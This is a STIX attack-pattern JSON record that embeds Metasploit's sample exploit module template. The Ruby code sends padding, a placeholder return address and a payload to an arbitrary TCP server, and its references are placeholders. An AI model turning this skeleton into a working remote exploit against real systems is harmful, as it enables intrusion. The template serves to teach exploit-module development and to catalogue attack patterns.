{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ee06e8a-7be9-4c13-9c39-090bedda73fe",
    "created": "2024-08-14T16:33:25.670008Z",
    "modified": "2024-08-14T16:33:25.670015Z",
    "name": "Sample Exploit",
    "description": " This exploit module illustrates how a vulnerability could be exploited in an TCP server that has a parsing bug.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/example.rb",
            "external_id": "example.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.example.com"
        },
        {
            "source_name": "CVE",
            "external_id": "1978-1234"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# This exploit sample shows how an exploit module could be written to exploit\n# a bug in an arbitrary TCP server.\n#\n###\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html\n\n  #\n  # This exploit affects TCP servers, so we use the TCP client mixin.\n  # See ./documentation/samples/vulnapps/testsrv/testsrv.c for building the\n  # vulnerable target program.\n  #\n  include Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        # The Name should be just like the line of a Git commit - software name,\n        # vuln type, class. Preferably apply\n        # some search optimization so people can actually find the module.\n        # We encourage consistency between module name and file name.\n        'Name' => 'Sample Exploit',\n        'Description' => %q{\n          This exploit module illustrates how a vulnerability could be exploited\n          in an TCP server that has a parsing bug.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['skape'],\n        'References' => [\n          [ 'OSVDB', '12345' ],\n          [ 'EDB', '12345' ],\n          [ 'URL', 'http://www.example.com'],\n          [ 'CVE', '1978-1234']\n        ],\n        'Payload' => {\n          'Space' => 1000,\n          'BadChars' => \"\\x00\"\n        },\n        'Targets' => [\n          # Target 0: Windows All\n          [\n            'Windows XP/Vista/7/8',\n            {\n              'Platform' => 'win',\n              'Ret' => 0x41424344\n            }\n          ]\n        ],\n        'DisclosureDate' => '2020-12-30',\n        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.\n        # It's generally easiest just to put the default at the beginning of the list and skip this\n        # entirely.\n        'DefaultTarget' => 0,\n        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n  end\n\n  #\n  # The sample exploit just indicates that the remote host is always\n  # vulnerable.\n  #\n  def check\n    CheckCode::Vulnerable\n  end\n\n  #\n  # The exploit method connects to the remote service and sends 1024 random bytes\n  # followed by the fake return address and then the payload.\n  #\n  def exploit\n    connect\n\n    print_status(\"Sending #{payload.encoded.length} byte payload...\")\n\n    # Build the buffer for transmission\n    buf = rand_text_alpha(1024)\n    buf << [ target.ret ].pack('V')\n    buf << payload.encoded\n\n    # Send it off\n    sock.put(buf)\n    sock.get_once\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-12-30",
    "x_mitre_platforms": [
        "win'"
    ]
}